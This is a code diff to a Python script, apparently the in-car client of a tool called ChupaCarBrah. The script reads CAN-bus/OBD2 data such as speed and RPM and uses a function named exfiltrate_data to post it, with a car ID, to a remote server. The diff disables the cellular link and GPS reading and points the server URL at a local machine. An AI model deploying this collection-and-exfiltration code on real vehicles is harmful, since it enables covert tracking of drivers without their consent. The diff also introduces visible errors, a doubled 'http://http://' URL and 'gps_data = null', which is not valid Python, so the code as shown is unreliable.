@@ -9,12 +9,12 @@ import requests
 import serial
 import can
 import psutil
-from Hologram.CustomCloud import CustomCloud
+# from Hologram.CustomCloud import CustomCloud
 
 
 global server_url
 # provide the URL for your ChupaCarBrah server (See https://github.com/blupants/chupacarbrah_server)
-server_url = "http://chupacarbrah-env.eba-bdahj3wp.us-east-2.elasticbeanstalk.com/"
+server_url = "http://http://lucs-macbook-pro.local:8080/"
 
 global obd2_csv_file
 #obd2_csv_file = "obd2_std_PIDs_enabled.csv"
@@ -51,36 +51,36 @@ global base_dir
 base_dir = os.path.dirname(os.path.abspath(__file__))
 
 
-def hologram_network_connect():
-    hologram_network_disconnect()
-    time.sleep(2)
-    cloud = CustomCloud(None, network='cellular')
-    cloud.network.disable_at_sockets_mode()
-    res = cloud.network.connect()
-    message = ""
-    if res:
-        message = "PPP session started"
-    else:
-        message = "Failed to start PPP"
+#def hologram_network_connect():
+#    hologram_network_disconnect()
+#    time.sleep(2)
+#    cloud = CustomCloud(None, network='cellular')
+#    cloud.network.disable_at_sockets_mode()
+#    res = cloud.network.connect()
+#    message = ""
+#    if res:
+#        message = "PPP session started"
+#    else:
+#        message = "Failed to start PPP"
+#
+#    _output_message(message)
 
-    _output_message(message)
 
-
-def hologram_network_disconnect():
-    _output_message('Checking for existing PPP sessions')
-    for proc in psutil.process_iter():
-
-        try:
-            pinfo = proc.as_dict(attrs=['pid', 'name'])
-        except:
-            _output_message("Failed to check for existing PPP sessions")
-
-        if 'pppd' in pinfo['name']:
-            _output_message('Found existing PPP session on pid: %s' % pinfo['pid'])
-            _output_message('Killing pid %s now' % pinfo['pid'])
-            process = psutil.Process(pinfo['pid'])
-            process.terminate()
-            process.wait()
+#def hologram_network_disconnect():
+#    _output_message('Checking for existing PPP sessions')
+#    for proc in psutil.process_iter():
+#
+#        try:
+#            pinfo = proc.as_dict(attrs=['pid', 'name'])
+#        except:
+#            _output_message("Failed to check for existing PPP sessions")
+#
+#        if 'pppd' in pinfo['name']:
+#            _output_message('Found existing PPP session on pid: %s' % pinfo['pid'])
+#            _output_message('Killing pid %s now' % pinfo['pid'])
+#            process = psutil.Process(pinfo['pid'])
+#            process.terminate()
+#            process.wait()
 
 
 def _output_message(message):
@@ -125,27 +125,27 @@ def _get_car_uuid():
     return car_uuid
 
 
-def _read_gps_data():
-    gps_data = ""
-    utf_data = ""
-    ser = serial.Serial('/dev/ttyO2', 4800)
-    counter = 0
-    while utf_data.find("GPRMC") == -1:
-        counter += 1
-        try:
-            ser_data = ser.readline()
-            utf_data = ser_data.decode()
-        except:
-            utf_data = ""
-        time.sleep(0.5)
-        if counter > 50:
-            break
-    ser.close()
-    if utf_data.find("GPRMC") != -1:
-        utf_data = utf_data.replace('\r', '')
-        utf_data = utf_data.replace('\n', '')
-        gps_data = utf_data
-    return gps_data
+#def _read_gps_data():
+#    gps_data = ""
+#    utf_data = ""
+#    ser = serial.Serial('/dev/ttyO2', 4800)
+#    counter = 0
+#    while utf_data.find("GPRMC") == -1:
+#        counter += 1
+#        try:
+#            ser_data = ser.readline()
+#            utf_data = ser_data.decode()
+#        except:
+#            utf_data = ""
+#        time.sleep(0.5)
+#        if counter > 50:
+#            break
+#    ser.close()
+#    if utf_data.find("GPRMC") != -1:
+#        utf_data = utf_data.replace('\r', '')
+#        utf_data = utf_data.replace('\n', '')
+#        gps_data = utf_data
+#    return gps_data
 
 
 def exfiltrate_data(data):
@@ -154,7 +154,7 @@ def exfiltrate_data(data):
     _output_message("Sending GPS data...")
     with open(memory_folder + os.sep + exported_data_file, "a+") as f:
         f.write(json.dumps(data)+"\n\n")
-    url = server_url + "/api/v1/cars"
+    url = server_url + "/api"
     car_uuid = _get_car_uuid()
     params = dict(
         car_uuid=car_uuid
@@ -187,7 +187,7 @@ def run():
 
     bus = can.interface.Bus(bustype='socketcan', channel=can_interface, bitrate=bitrate)
 
-    hologram_network_connect()
+    #hologram_network_connect()
 
     start = time.time()
 
@@ -277,14 +277,15 @@ def run():
             if minutes >= exfiltrate_interval:
                 car_uuid = _get_car_uuid()
                 timestamp = str(datetime.datetime.now())
-                gps_data = _read_gps_data()
+                #gps_data = _read_gps_data()
+                gps_data = null
                 log = {"timestamp": timestamp, "GPS": gps_data, "speed": speed, "rpm": rpm, "temperature": intake_air_temperature}
                 data = {"car_uuid": car_uuid, "log": log}
                 if exfiltrate_data(data):
                     start = time.time()
 
 
-    hologram_network_disconnect()
+    #hologram_network_disconnect()
     bus.shutdown()
     os.system("ifconfig {can_interface} down".format(can_interface=can_interface))
     try:
